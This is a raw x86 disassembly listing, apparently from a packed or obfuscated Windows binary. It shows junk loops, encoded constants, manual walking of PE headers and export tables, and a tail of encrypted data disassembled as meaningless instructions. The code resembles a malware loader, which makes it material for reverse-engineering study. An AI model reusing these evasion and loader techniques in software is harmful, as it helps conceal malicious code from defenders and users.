  408786:	xor    edx,ecx
  408788:	mov    ecx,DWORD PTR [ebp+0x8]
  40878b:	lea    ecx,[edx+ecx*1+0x3272db]
  408792:	cmp    ecx,eax
  408794:	jne    0x408730
  40879a:	mov    eax,esi
  40879c:	jmp    0x4087a6
  4087a1:	mov    eax,0x3272db
  4087a6:	mov    ebx,0x7510893
  4087ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4087ae:	xor    ecx,ebx
  4087b0:	add    ecx,eax
  4087b2:	mov    DWORD PTR [ebp-0xc],ecx
  4087b5:	mov    ebx,0x3874
  4087ba:	add    ebx,0x2342
  4087c0:	xchg   ebx,esi
  4087c2:	xor    ebx,ebx
  4087c4:	push   esi
  4087c5:	mov    esi,ebx
  4087c7:	pop    ebx
  4087c8:	mov    edx,esi
  4087ca:	add    ebx,0x1002
  4087d0:	lea    eax,[ebp-0x10]
  4087d3:	add    edx,eax
  4087d5:	add    edx,0x5
  4087d8:	push   edx
  4087d9:	inc    esi
  4087da:	pop    ecx
  4087db:	dec    ecx
  4087dc:	xchg   ecx,eax
  4087dd:	dec    eax
  4087de:	xchg   ecx,eax
  4087df:	dec    ecx
  4087e0:	xchg   ecx,edx
  4087e2:	dec    edx
  4087e3:	push   edx
  4087e4:	mov    edx,ebx
  4087e6:	pop    ebx
  4087e7:	dec    ebx
  4087e8:	call   DWORD PTR [ebx]
  4087ea:	cmp    DWORD PTR [ebp+0x10],esi
  4087ed:	je     0x40880c
  4087f3:	xchg   edx,eax
  4087f4:	push   0xb
  4087f6:	pop    ecx
  4087f7:	push   0x4
  4087f9:	pop    ebx
  4087fa:	inc    ebx
  4087fb:	xchg   ebx,ecx
  4087fd:	sub    ebx,ecx
  4087ff:	xchg   ebx,ecx
  408801:	dec    ecx
  408802:	dec    ecx
  408803:	mov    eax,DWORD PTR [ebp-0x1c]
  408806:	imul   eax,ecx
  408809:	add    esp,eax
  40880b:	xchg   edx,eax
  40880c:	push   eax
  40880d:	xor    ebx,ebx
  40880f:	mov    edx,esp
  408811:	dec    edx
  408812:	inc    ebx
  408813:	add    ebx,DWORD PTR [edx+ebx*1]
  408816:	dec    ebx
  408817:	xor    edx,edx
  408819:	add    DWORD PTR [ebp-0xc],ebx
  40881c:	pop    ebx
  40881d:	mov    eax,DWORD PTR [ebp-0xc]
  408820:	pop    edi
  408821:	pop    esi
  408822:	pop    ebx
  408823:	leave  
  408824:	ret    0x10
  408827:	or     DWORD PTR ds:0x42c00c,0x42a008
  408831:	xor    eax,eax
  408833:	add    DWORD PTR ds:0x428028,0x42a010
  40883d:	inc    eax
  40883e:	ret    
  40883f:	push   ebp
  408840:	mov    ebp,esp
  408842:	mov    eax,ds:0x421912
  408847:	and    DWORD PTR ds:0x42c008,0x0
  408851:	xor    ecx,ecx
  408853:	or     ecx,DWORD PTR ds:0x42c008
  408859:	inc    ecx
  40885a:	mov    DWORD PTR ds:0x42c008,ecx
  408860:	cmp    DWORD PTR ds:0x42c008,0xc
  408867:	jne    0x40887d
  40886d:	push   0x423596
  408872:	push   0x42354e
  408877:	call   DWORD PTR ds:0x424030
  40887d:	cmp    DWORD PTR ds:0x42c008,0xb
  408884:	jne    0x408897
  40888a:	mov    ecx,DWORD PTR ds:0x42c008
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x42c008,ecx
  408897:	cmp    DWORD PTR ds:0x42c008,0x1b
  40889e:	jb     0x408851
  4088a4:	xor    ecx,DWORD PTR ds:0x42a01c
  4088aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4088b0:	add    ecx,0x4e81
  4088b6:	mov    eax,DWORD PTR [eax]
  4088b8:	and    ecx,DWORD PTR ds:0x42b018
  4088be:	cdq    
  4088bf:	push   ebx
  4088c0:	mov    ecx,0xfabdbef1
  4088c5:	add    ebx,0x1541
  4088cb:	add    eax,ecx
  4088cd:	adc    edx,0xffffffff
  4088d0:	push   esi
  4088d1:	push   edi
  4088d2:	mov    edi,DWORD PTR ds:0x421732
  4088d8:	mov    ebx,DWORD PTR ds:0x42175a
  4088de:	sub    edi,ebx
  4088e0:	or     edi,DWORD PTR [edi+ebx*1]
  4088e3:	mov    edi,edx
  4088e5:	and    DWORD PTR ds:0x429000,0x0
  4088ef:	jmp    0x408901
  4088f4:	mov    edx,DWORD PTR ds:0x429000
  4088fa:	inc    edx
  4088fb:	mov    DWORD PTR ds:0x429000,edx
  408901:	cmp    DWORD PTR ds:0x429000,0x1a
  408908:	jae    0x40895a
  40890e:	cmp    DWORD PTR ds:0x429000,0x7
  408915:	jne    0x40893b
  40891b:	push   DWORD PTR [ebp-0x1c]
  40891e:	push   0x85ec
  408923:	push   0x4f88
  408928:	push   DWORD PTR [ebp-0x10]
  40892b:	push   0x6e2c
  408930:	push   0x428000
  408935:	call   DWORD PTR ds:0x424038
  40893b:	cmp    DWORD PTR ds:0x429000,0x6
  408942:	jne    0x408955
  408948:	mov    edx,DWORD PTR ds:0x429000
  40894e:	inc    edx
  40894f:	mov    DWORD PTR ds:0x429000,edx
  408955:	jmp    0x4088f4
  40895a:	mov    edx,DWORD PTR [ebp+0x8]
  40895d:	adc    DWORD PTR ds:0x42a00c,0x42801c
  408967:	mov    ebx,eax
  408969:	mov    eax,0x8a29a123
  40896e:	xor    esi,esi
  408970:	xor    ebx,eax
  408972:	xor    edi,0x0
  408975:	and    DWORD PTR ds:0x429000,0x1a3f
  40897f:	add    edx,ecx
  408981:	adc    esi,0xffffffff
  408984:	xor    edx,eax
  408986:	xor    esi,0x0
  408989:	cmp    edx,ebx
  40898b:	jne    0x408999
  408991:	cmp    esi,edi
  408993:	je     0x4089c8
  408999:	mov    edx,DWORD PTR ds:0x421912
  40899f:	mov    edx,DWORD PTR [edx+0x1c0]
  4089a5:	mov    edx,DWORD PTR [edx]
  4089a7:	xor    esi,esi
  4089a9:	add    edx,ecx
  4089ab:	adc    esi,0xffffffff
  4089ae:	xor    edx,eax
  4089b0:	xor    esi,0x0
  4089b3:	cmp    edx,0x70941fd1
  4089b9:	jne    0x408a32
  4089bf:	cmp    esi,0xffffffff
  4089c2:	jne    0x408a32
  4089c8:	mov    edx,DWORD PTR ds:0x421996
  4089ce:	mov    esi,DWORD PTR ds:0x42198e
  4089d4:	xor    edx,esi
  4089d6:	mov    DWORD PTR ds:0x42198e,edx
  4089dc:	mov    edx,DWORD PTR [ebp+0xc]
  4089df:	mov    edx,DWORD PTR [edx]
  4089e1:	mov    edx,DWORD PTR [edx]
  4089e3:	mov    esi,DWORD PTR ds:0x42198e
  4089e9:	add    DWORD PTR [edx],esi
  4089eb:	mov    esi,DWORD PTR [ebp+0x8]
  4089ee:	mov    edx,DWORD PTR ds:0x42198e
  4089f4:	xor    esi,0x7510893
  4089fa:	add    esi,0x3272db
  408a00:	xor    ebx,ebx
  408a02:	add    esi,ecx
  408a04:	adc    ebx,0xffffffff
  408a07:	xor    edi,edi
  408a09:	xor    esi,eax
  408a0b:	xor    ebx,0x0
  408a0e:	add    edx,ecx
  408a10:	adc    edi,0xffffffff
  408a13:	xor    edx,eax
  408a15:	xor    edi,0x0
  408a18:	cmp    edx,esi
  408a1a:	jne    0x408a32
  408a20:	cmp    edi,ebx
  408a22:	jne    0x408a32
  408a28:	mov    eax,ds:0x42198e
  408a2d:	mov    ds:0x421996,eax
  408a32:	pop    edi
  408a33:	pop    esi
  408a34:	pop    ebx
  408a35:	pop    ebp
  408a36:	ret    0x8
  408a39:	push   ebp
  408a3a:	mov    ebp,esp
  408a3c:	push   ecx
  408a3d:	mov    eax,ds:0x42175e
  408a42:	mov    eax,DWORD PTR [eax]
  408a44:	add    DWORD PTR ds:0x42901c,eax
  408a4a:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  408a51:	mov    eax,DWORD PTR [ebp+0x8]
  408a54:	adc    DWORD PTR ds:0x42a010,0x6bac
  408a5e:	mov    al,BYTE PTR [eax]
  408a60:	xor    DWORD PTR ds:0x42b018,0x428020
  408a6a:	add    al,0xd
  408a6c:	sbb    DWORD PTR ds:0x428004,0x428008
  408a76:	xor    al,0x6f
  408a78:	mov    DWORD PTR ds:0x428004,0x2e21
  408a82:	cmp    al,0x35
  408a84:	mov    DWORD PTR ds:0x42a00c,0x23cb
  408a8e:	jne    0x408b4b
  408a94:	and    DWORD PTR ds:0x428024,0x429014
  408a9e:	mov    eax,DWORD PTR [ebp+0x8]
  408aa1:	dec    edx
  408aa2:	mov    ecx,DWORD PTR [ebp+0x8]
  408aa5:	and    edx,DWORD PTR ds:0x42b010
  408aab:	add    ecx,DWORD PTR [eax+0x3c]
  408aae:	mov    edx,0x7510893
  408ab3:	mov    DWORD PTR [ebp+0x8],ecx
  408ab6:	and    DWORD PTR ds:0x42c008,0x0
  408ac0:	jmp    0x408ad2
  408ac5:	mov    ecx,DWORD PTR ds:0x42c008
  408acb:	inc    ecx
  408acc:	mov    DWORD PTR ds:0x42c008,ecx
  408ad2:	cmp    DWORD PTR ds:0x42c008,0x18
  408ad9:	jae    0x408b1d
  408adf:	cmp    DWORD PTR ds:0x42c008,0x9
  408ae6:	jne    0x408afc
  408aec:	push   0x429014
  408af1:	push   0x5ace
  408af6:	call   DWORD PTR ds:0x42403c
  408afc:	cmp    DWORD PTR ds:0x42c008,0x8
  408b03:	jne    0x408b18
  408b09:	xor    ecx,ecx
  408b0b:	or     ecx,DWORD PTR ds:0x42c008
  408b11:	inc    ecx
  408b12:	mov    DWORD PTR ds:0x42c008,ecx
  408b18:	jmp    0x408ac5
  408b1d:	mov    eax,DWORD PTR [ebp-0x4]
  408b20:	xor    eax,edx
  408b22:	push   esi
  408b23:	mov    esi,DWORD PTR [ebp+0x8]
  408b26:	mov    ecx,0x3272db
  408b2b:	add    eax,ecx
  408b2d:	cmp    DWORD PTR [esi+0x54],eax
  408b30:	pop    esi
  408b31:	je     0x408b3f
  408b37:	mov    eax,DWORD PTR [ebp+0x8]
  408b3a:	jmp    0x408b58
  408b3f:	mov    eax,DWORD PTR [ebp-0x4]
  408b42:	xor    eax,edx
  408b44:	add    eax,ecx
  408b46:	jmp    0x408b58
  408b4b:	mov    eax,DWORD PTR [ebp-0x4]
  408b4e:	xor    eax,0x7510893
  408b53:	add    eax,0x3272db
  408b58:	leave  
  408b59:	ret    0x4
  408b5c:	push   ebp
  408b5d:	mov    ebp,esp
  408b5f:	sub    esp,0x18
  408b62:	and    DWORD PTR ds:0x42901c,0x0
  408b6c:	jmp    0x408b7e
  408b71:	mov    edx,DWORD PTR ds:0x42901c
  408b77:	inc    edx
  408b78:	mov    DWORD PTR ds:0x42901c,edx
  408b7e:	cmp    DWORD PTR ds:0x42901c,0x1a
  408b85:	jae    0x408bb7
  408b8b:	cmp    DWORD PTR ds:0x42901c,0x22
  408b92:	jne    0x408ba8
  408b98:	push   0x8447
  408b9d:	push   0x4235a4
  408ba2:	call   DWORD PTR ds:0x424040
  408ba8:	jmp    0x408b71
  408bad:	adc    DWORD PTR ds:0x42b010,0x42b00c
  408bb7:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  408bbe:	mov    ecx,DWORD PTR ds:0x42172a
  408bc4:	mov    ecx,DWORD PTR [ecx]
  408bc6:	and    DWORD PTR ds:0x42c01c,ecx
  408bcc:	lea    eax,[ebp+0x14]
  408bcf:	mov    DWORD PTR [ebp-0x4],eax
  408bd2:	push   esi
  408bd3:	and    DWORD PTR ds:0x428018,0x0
  408bdd:	jmp    0x408bef
  408be2:	mov    esi,DWORD PTR ds:0x428018
  408be8:	inc    esi
  408be9:	mov    DWORD PTR ds:0x428018,esi
  408bef:	cmp    DWORD PTR ds:0x428018,0x1a
  408bf6:	jae    0x408cc4
  408bfc:	cmp    DWORD PTR ds:0x428018,0x28
  408c03:	jne    0x408c14
  408c09:	push   0x4235bf
  408c0e:	call   DWORD PTR ds:0x424044
  408c14:	jmp    0x408be2
  408c19:	and    DWORD PTR ds:0x42c000,0x0
  408c23:	mov    edx,DWORD PTR ds:0x42c000
  408c29:	inc    edx
  408c2a:	mov    DWORD PTR ds:0x42c000,edx
  408c30:	cmp    DWORD PTR ds:0x42c000,0x20
  408c37:	jne    0x408c52
  408c3d:	push   0x1ea1
  408c42:	push   0x42b008
  408c47:	push   0x423682
  408c4c:	call   DWORD PTR ds:0x424048
  408c52:	cmp    DWORD PTR ds:0x42c000,0x11
  408c59:	jb     0x408c23
  408c5f:	and    DWORD PTR ds:0x42b004,0x0
  408c69:	mov    edx,DWORD PTR ds:0x42b004
  408c6f:	inc    edx
  408c70:	mov    DWORD PTR ds:0x42b004,edx
  408c76:	cmp    DWORD PTR ds:0x42b004,0xf
  408c7d:	jne    0x408c93
  408c83:	push   0x428004
  408c88:	push   0x7cc5
  408c8d:	call   DWORD PTR ds:0x424014
  408c93:	cmp    DWORD PTR ds:0x42b004,0xe
  408c9a:	jne    0x408cad
  408ca0:	mov    edx,DWORD PTR ds:0x42b004
  408ca6:	inc    edx
  408ca7:	mov    DWORD PTR ds:0x42b004,edx
  408cad:	cmp    DWORD PTR ds:0x42b004,0x1d
  408cb4:	jb     0x408c69
  408cba:	mov    DWORD PTR ds:0x428014,0x22a8
  408cc4:	mov    esi,0xf89c85b6
  408cc9:	and    DWORD PTR ds:0x428008,0x0
  408cd3:	mov    edx,DWORD PTR ds:0x428008
  408cd9:	inc    edx
  408cda:	mov    DWORD PTR ds:0x428008,edx
  408ce0:	cmp    DWORD PTR ds:0x428008,0x19
  408ce7:	jne    0x408d17
  408ced:	push   0x62e7
  408cf2:	push   0x428000
  408cf7:	push   0x75f3
  408cfc:	push   0x428000
  408d01:	push   DWORD PTR [ebp-0x24]
  408d04:	push   0x6458
  408d09:	push   DWORD PTR [ebp-0x14]
  408d0c:	push   0x5743
  408d11:	call   DWORD PTR ds:0x424018
  408d17:	cmp    DWORD PTR ds:0x428008,0x14
  408d1e:	jb     0x408cd3
  408d24:	xor    ecx,ecx
  408d26:	add    ecx,DWORD PTR ds:0x429008
  408d2c:	adc    DWORD PTR ds:0x42c00c,ecx
  408d32:	mov    DWORD PTR [ebp-0xc],esi
  408d35:	lea    eax,[ebp-0xc]
  408d38:	dec    ecx
  408d39:	mov    DWORD PTR [ebp-0x14],eax
  408d3c:	mov    eax,DWORD PTR [ebp-0xc]
  408d3f:	adc    ecx,0x29e6
  408d45:	mov    edx,DWORD PTR [ebp-0x14]
  408d48:	and    DWORD PTR ds:0x428018,0x0
  408d52:	mov    ecx,DWORD PTR ds:0x428018
  408d58:	inc    ecx
  408d59:	mov    DWORD PTR ds:0x428018,ecx
  408d5f:	cmp    DWORD PTR ds:0x428018,0xb
  408d66:	jne    0x408d77
  408d6c:	push   0x4faf
  408d71:	call   DWORD PTR ds:0x42401c
  408d77:	cmp    DWORD PTR ds:0x428018,0xa
  408d7e:	jne    0x408d91
  408d84:	mov    ecx,DWORD PTR ds:0x428018
  408d8a:	inc    ecx
  408d8b:	mov    DWORD PTR ds:0x428018,ecx
  408d91:	cmp    DWORD PTR ds:0x428018,0x1e
  408d98:	jb     0x408d52
  408d9e:	inc    ecx
  408d9f:	mov    ecx,0x7510893
  408da4:	neg    DWORD PTR ds:0x42a004
  408daa:	xor    eax,ecx
  408dac:	add    eax,0x3272db
  408db1:	and    DWORD PTR ds:0x42c010,0x2759
  408dbb:	mov    DWORD PTR [edx],eax
  408dbd:	mov    edx,DWORD PTR ds:0x421722
  408dc3:	mov    eax,ds:0x421732
  408dc8:	sub    edx,eax
  408dca:	and    edx,DWORD PTR [edx+eax*1]
  408dcd:	mov    eax,ds:0x42178a
  408dd2:	inc    DWORD PTR ds:0x42a01c
  408dd8:	mov    edx,DWORD PTR [ebp-0x4]
  408ddb:	and    DWORD PTR ds:0x42a018,0x7b9c
  408de5:	mov    eax,DWORD PTR [eax]
  408de7:	and    DWORD PTR ds:0x42c000,0x5f81
  408df1:	add    eax,DWORD PTR [edx]
  408df3:	movzx  edx,BYTE PTR ds:0x42a014
  408dfa:	or     DWORD PTR ds:0x42a01c,edx
  408e00:	push   edi
  408e01:	add    DWORD PTR ds:0x42a004,edx
  408e07:	mov    DWORD PTR [ebp-0x8],eax
  408e0a:	movzx  edx,WORD PTR ds:0x428004
  408e11:	sbb    DWORD PTR ds:0x42a01c,edx
  408e17:	mov    edi,DWORD PTR [ebp+0x8]
  408e1a:	and    DWORD PTR ds:0x42b01c,0x631e
  408e24:	mov    eax,ds:0x421912
  408e29:	mov    eax,DWORD PTR [eax+0x198]
  408e2f:	xor    edi,ecx
  408e31:	mov    DWORD PTR ds:0x428018,0x14
  408e3b:	cmp    DWORD PTR ds:0x428018,0x0
  408e42:	je     0x408e95
  408e48:	cmp    DWORD PTR ds:0x428018,0x3
  408e4f:	jne    0x408e63
  408e55:	push   DWORD PTR [ebp-0x28]
  408e58:	push   0x77dc
  408e5d:	call   DWORD PTR ds:0x424020
  408e63:	cmp    DWORD PTR ds:0x428018,0x4
  408e6a:	jne    0x408e7d
  408e70:	mov    edx,DWORD PTR ds:0x428018
  408e76:	dec    edx
  408e77:	mov    DWORD PTR ds:0x428018,edx
  408e7d:	mov    edx,DWORD PTR ds:0x428018
  408e83:	dec    edx
  408e84:	mov    DWORD PTR ds:0x428018,edx
  408e8a:	jmp    0x408e3b
  408e8f:	and    DWORD PTR ds:0x42c014,ecx
  408e95:	mov    edx,0x3272db
  408e9a:	sbb    DWORD PTR ds:0x429008,0x451c
  408ea4:	add    edi,edx
  408ea6:	mov    DWORD PTR ds:0x42a000,0x2432
  408eb0:	cmp    DWORD PTR [eax],edi
  408eb2:	je     0x408ebf
  408eb8:	mov    eax,DWORD PTR [eax]
  408eba:	jmp    0x409144
  408ebf:	mov    eax,DWORD PTR [ebp+0x18]
  408ec2:	cmp    eax,esi
  408ec4:	jne    0x408ede
  408eca:	mov    DWORD PTR ds:0x42a01c,0x2296
  408ed4:	push   0xf89c85b5
  408ed9:	jmp    0x409133
  408ede:	mov    esi,DWORD PTR [ebp+0x18]
  408ee1:	mov    eax,0x2f4e
  408ee6:	mov    eax,0xf89c85b4
  408eeb:	cmp    esi,eax
  408eed:	jne    0x409123
  408ef3:	sbb    esi,esi
  408ef5:	mov    eax,DWORD PTR [ebp+0x10]
  408ef8:	mov    esi,DWORD PTR ds:0x42c008
  408efe:	sbb    esi,DWORD PTR ds:0x42a008
  408f04:	mov    DWORD PTR ds:0x42c008,esi
  408f0a:	xor    eax,ecx
  408f0c:	mov    DWORD PTR ds:0x428000,0x1b
  408f16:	cmp    DWORD PTR ds:0x428000,0x0
  408f1d:	je     0x408f86
  408f23:	cmp    DWORD PTR ds:0x428000,0x4
  408f2a:	jne    0x408f5a
  408f30:	push   0x42a000
  408f35:	push   0x8ffd
  408f3a:	push   DWORD PTR [ebp-0x14]
  408f3d:	push   0x428014
  408f42:	push   0x2d9f
  408f47:	push   0x4236fc
  408f4c:	push   0x4cf3
  408f51:	push   DWORD PTR [ebp-0x1c]
  408f54:	call   DWORD PTR ds:0x424024
  408f5a:	cmp    DWORD PTR ds:0x428000,0x5
  408f61:	jne    0x408f74
  408f67:	mov    esi,DWORD PTR ds:0x428000
  408f6d:	dec    esi
  408f6e:	mov    DWORD PTR ds:0x428000,esi
  408f74:	mov    esi,DWORD PTR ds:0x428000
  408f7a:	dec    esi
  408f7b:	mov    DWORD PTR ds:0x428000,esi
  408f81:	jmp    0x408f16
  408f86:	add    eax,edx
  408f88:	mov    DWORD PTR [ebp-0x18],eax
  408f8b:	mov    eax,DWORD PTR [ebp+0xc]
  408f8e:	mov    esi,DWORD PTR [ebp-0x8]
  408f91:	xor    eax,ecx
  408f93:	add    eax,edx
  408f95:	imul   eax,DWORD PTR [esi]
  408f98:	mov    esi,DWORD PTR [ebp+0x8]
  408f9b:	xor    esi,ecx
  408f9d:	add    esi,edx
  408f9f:	cmp    esi,eax
  408fa1:	mov    eax,DWORD PTR [ebp-0x4]
  408fa4:	push   ebx
  408fa5:	je     0x408fc4
  408fab:	mov    esi,DWORD PTR [ebp-0x18]
  408fae:	add    DWORD PTR [eax],esi
  408fb0:	mov    eax,DWORD PTR [ebp-0x4]
  408fb3:	mov    esi,DWORD PTR [ebp+0xc]
  408fb6:	xor    esi,ecx
  408fb8:	add    esi,edx
  408fba:	imul   esi,DWORD PTR [eax]
  408fbd:	mov    DWORD PTR [eax],esi
  408fbf:	jmp    0x408fc9
  408fc4:	mov    esi,DWORD PTR [ebp+0x14]
  408fc7:	xor    DWORD PTR [eax],esi
  408fc9:	mov    eax,DWORD PTR [ebp-0x4]
  408fcc:	mov    edi,DWORD PTR [ebp+0x10]
  408fcf:	xor    edi,ecx
  408fd1:	mov    esi,0xffcd8d25
  408fd6:	mov    ebx,esi
  408fd8:	sub    ebx,edi
  408fda:	add    DWORD PTR [eax],ebx
  408fdc:	mov    eax,DWORD PTR [ebp-0x4]
  408fdf:	mov    edi,DWORD PTR [ebp-0x8]
  408fe2:	add    edi,DWORD PTR [eax]
  408fe4:	mov    DWORD PTR [ebp-0x8],edi
  408fe7:	mov    eax,DWORD PTR [ebp+0xc]
  408fea:	mov    edi,DWORD PTR [ebp+0xc]
  408fed:	xor    edi,ecx
  408fef:	xor    eax,ecx
  408ff1:	lea    eax,[eax+edi*1+0x64e5b6]
  408ff8:	mov    edi,DWORD PTR [ebp+0xc]
  408ffb:	xor    edi,ecx
  408ffd:	add    edi,edx
  408fff:	imul   eax,edi
  409002:	mov    edi,DWORD PTR [ebp+0xc]
  409005:	xor    edi,ecx
  409007:	sub    edi,eax
  409009:	mov    eax,DWORD PTR [ebp-0x4]
  40900c:	add    edi,edx
  40900e:	cmp    DWORD PTR [eax],edi
  409010:	mov    eax,DWORD PTR [ebp-0x4]
  409013:	mov    edi,DWORD PTR [ebp+0x10]
  409016:	jg     0x409029
  40901c:	xor    edi,ecx
  40901e:	mov    ebx,esi
  409020:	sub    ebx,edi
  409022:	add    DWORD PTR [eax],ebx
  409024:	jmp    0x40902f
  409029:	xor    edi,ecx
  40902b:	add    edi,edx
  40902d:	add    DWORD PTR [eax],edi
  40902f:	mov    eax,DWORD PTR [ebp-0x8]
  409032:	mov    edi,DWORD PTR [ebp-0x10]
  409035:	mov    eax,DWORD PTR [eax]
  409037:	xor    edi,ecx
  409039:	add    edi,0x3272da
  40903f:	not    edi
  409041:	and    eax,edi
  409043:	movsx  di,BYTE PTR [eax+0x1]
  409048:	mov    ebx,0x3b4b
  40904d:	sub    di,bx
  409050:	mov    ebx,0x8a85
  409055:	xor    di,bx
  409058:	mov    ebx,0x4f8a
  40905d:	cmp    di,bx
  409060:	jne    0x409088
  409066:	movsx  di,BYTE PTR [eax]
  40906a:	mov    ebx,0x3b4b
  40906f:	sub    di,bx
  409072:	mov    ebx,0x8a85
  409077:	xor    di,bx
  40907a:	mov    ebx,0x4f87
  40907f:	cmp    di,bx
  409082:	je     0x409098
  409088:	mov    edi,DWORD PTR [ebp-0x10]
  40908b:	xor    edi,ecx
  40908d:	mov    ebx,esi
  40908f:	sub    ebx,edi
  409091:	add    eax,ebx
  409093:	jmp    0x409043
  409098:	mov    esi,DWORD PTR [ebp-0x14]
  40909b:	mov    esi,DWORD PTR [esi]
  40909d:	mov    edi,DWORD PTR [eax+0x3c]
  4090a0:	lea    esi,[edi+esi*8+0x78]
  4090a4:	mov    esi,DWORD PTR [esi+eax*1]
  4090a7:	mov    DWORD PTR [ebp-0x8],esi
  4090aa:	mov    esi,DWORD PTR [ebp+0x8]
  4090ad:	xor    esi,ecx
  4090af:	add    esi,edx
  4090b1:	mov    DWORD PTR [ebp-0x14],esi
  4090b4:	mov    esi,DWORD PTR [ebp+0x8]
  4090b7:	mov    edi,DWORD PTR [ebp-0x8]
  4090ba:	xor    esi,ecx
  4090bc:	add    esi,edx
  4090be:	pop    ebx
  4090bf:	cmp    edi,esi
  4090c1:	jne    0x4090df
  4090c7:	mov    eax,DWORD PTR [ebp+0xc]
  4090ca:	xor    eax,ecx
  4090cc:	mov    ecx,DWORD PTR [ebp-0x8]
  4090cf:	add    eax,edx
  4090d1:	imul   eax,ecx
  4090d4:	mov    DWORD PTR [ebp-0x8],eax
  4090d7:	push   DWORD PTR [ebp+0x18]
  4090da:	jmp    0x409133
  4090df:	mov    ecx,DWORD PTR [ebp-0x8]
  4090e2:	add    ecx,eax
  4090e4:	mov    DWORD PTR [ebp-0x14],ecx
  4090e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4090ea:	mov    ecx,DWORD PTR [ecx+0xc]
  4090ed:	movsx  cx,BYTE PTR [ecx+eax*1]
  4090f2:	mov    edx,0x3b4b
  4090f7:	sub    cx,dx
  4090fa:	mov    edx,0x8a85
  4090ff:	xor    cx,dx
  409102:	mov    edx,0x4f85
  409107:	cmp    cx,dx
  40910a:	jne    0x4090d7
  409110:	mov    ecx,DWORD PTR ds:0x421912
  409116:	mov    ecx,DWORD PTR [ecx+0x198]
  40911c:	mov    DWORD PTR [ecx],eax
  40911e:	jmp    0x409144
  409123:	mov    ecx,DWORD PTR [ebp+0x18]
  409126:	cmp    ecx,0xf89c85b5
  40912c:	jne    0x409144
  409132:	push   eax
  409133:	push   DWORD PTR [ebp+0x14]
  409136:	push   DWORD PTR [ebp+0x10]
  409139:	push   DWORD PTR [ebp+0xc]
  40913c:	push   DWORD PTR [ebp+0x8]
  40913f:	call   0x408b5c
  409144:	pop    edi
  409145:	pop    esi
  409146:	leave  
  409147:	ret    0x14
  40914a:	push   ebp
  40914b:	mov    ebp,esp
  40914d:	push   ecx
  40914e:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  409155:	mov    eax,DWORD PTR [ebp-0x4]
  409158:	mov    ecx,DWORD PTR ds:0x42b010
  40915e:	sbb    DWORD PTR ds:0x42a018,ecx
  409164:	mov    edx,DWORD PTR [ebp+0x10]
  409167:	mov    DWORD PTR ds:0x42801c,0x4950
  409171:	mov    ecx,0x7510893
  409176:	sbb    DWORD PTR ds:0x428028,0x4a48
  409180:	xor    eax,ecx
  409182:	add    DWORD PTR ds:0x42b000,0x42800c
  40918c:	add    eax,0x3272db
  409191:	mov    DWORD PTR ds:0x42a014,0x169
  40919b:	mov    DWORD PTR [edx],eax
  40919d:	sbb    eax,edx
  40919f:	mov    eax,DWORD PTR [ebp+0xc]
  4091a2:	xor    eax,ecx
  4091a4:	inc    edx
  4091a5:	push   esi
  4091a6:	xor    esi,edx
  4091a8:	mov    esi,DWORD PTR [ebp+0x10]
  4091ab:	mov    edx,0x3272db
  4091b0:	add    eax,edx
  4091b2:	add    DWORD PTR ds:0x42b01c,0x428020
  4091bc:	mov    DWORD PTR [esi+0x4],eax
  4091bf:	mov    eax,DWORD PTR [ebp+0x14]
  4091c2:	mov    esi,DWORD PTR ds:0x428024
  4091c8:	sbb    esi,DWORD PTR ds:0x429010
  4091ce:	mov    DWORD PTR ds:0x428024,esi
  4091d4:	mov    esi,DWORD PTR [ebp+0x10]
  4091d7:	mov    DWORD PTR [esi+0x8],eax
  4091da:	mov    eax,DWORD PTR [ebp+0x18]
  4091dd:	mov    esi,DWORD PTR [ebp+0x10]
  4091e0:	mov    DWORD PTR [esi+0xc],eax
  4091e3:	mov    eax,DWORD PTR [ebp+0x1c]
  4091e6:	mov    esi,DWORD PTR [ebp+0x10]
  4091e9:	mov    DWORD PTR [esi+0x10],eax
  4091ec:	mov    eax,DWORD PTR [ebp+0x8]
  4091ef:	xor    eax,ecx
  4091f1:	add    eax,edx
  4091f3:	pop    esi
  4091f4:	leave  
  4091f5:	ret    0x18
  4091f8:	push   ebp
  4091f9:	mov    ebp,esp
  4091fb:	sub    esp,0x94
  409201:	mov    eax,DWORD PTR [ebp+0x8]
  409204:	push   ebx
  409205:	neg    ecx
  409207:	jmp    0x40b57c
  40920c:	mov    dl,0xcf
  40920e:	enter  0x872f,0x27
  409212:	imul   ebp,DWORD PTR [edi+0x65],0xdcd7ebdc
  409219:	and    al,0x6f
  40921b:	stc    
  40921c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40921d:	sbb    BYTE PTR [edx+0x62],ah
  409220:	or     bl,BYTE PTR [edi+0x62]
  409223:	bound  eax,QWORD PTR [eax-0x31ba7df5]
  409229:	out    dx,al
  40922a:	dec    BYTE PTR [ebx-0x28]
  40922d:	rcl    DWORD PTR ds:0xda89073c,cl
  409233:	jb     0x4091c5
  409235:	mov    ebp,0x53b1384c
  40923a:	inc    eax
  40923b:	cdq    
  40923c:	mov    bl,BYTE PTR [ecx]
  40923e:	aam    0xe4
  409240:	xchg   ecx,eax
  409241:	je     0x4091dc
  409243:	adc    ch,BYTE PTR [edi+edx*1+0x4d7d0fcf]
  40924a:	push   ebx
  40924b:	dec    esp
  40924c:	push   edi
  40924d:	pop    es
  40924e:	repnz pop esi
  409250:	push   edi
  409251:	out    0x30,al
  409253:	ds jne 0x409202
  409256:	scas   al,BYTE PTR es:[edi]
  409257:	ret    0xc947
  40925a:	fs mov ecx,0x6c9cc22e
  409260:	in     al,0x87
  409262:	adc    edx,esp
  409264:	icebp  
  409265:	mov    edi,0xbf2a2f5e
  40926a:	in     al,dx
  40926b:	iret   
  40926c:	int    0xe
  40926e:	test   al,0x5f
  409270:	adc    al,0x30
  409272:	js     0x4092a7
  409274:	frstor [edi-0x2a060dbe]
  40927a:	adc    DWORD PTR [edi+0x1c],ebp
  40927d:	retf   
  40927e:	mov    ch,0xa4
  409280:	add    bh,al
  409282:	pop    ebp
  409283:	adc    eax,0x11a67475
  409288:	push   ss
  409289:	lds    edi,FWORD PTR [edi]
  40928b:	inc    eax
  40928c:	inc    DWORD PTR [ebp+0x20]
  40928f:	es sub al,0x29
  409292:	(bad)  
  409293:	int3   
  409294:	addr16 mov esi,edx
  409297:	inc    edi
  409298:	mov    ecx,0xace5215d
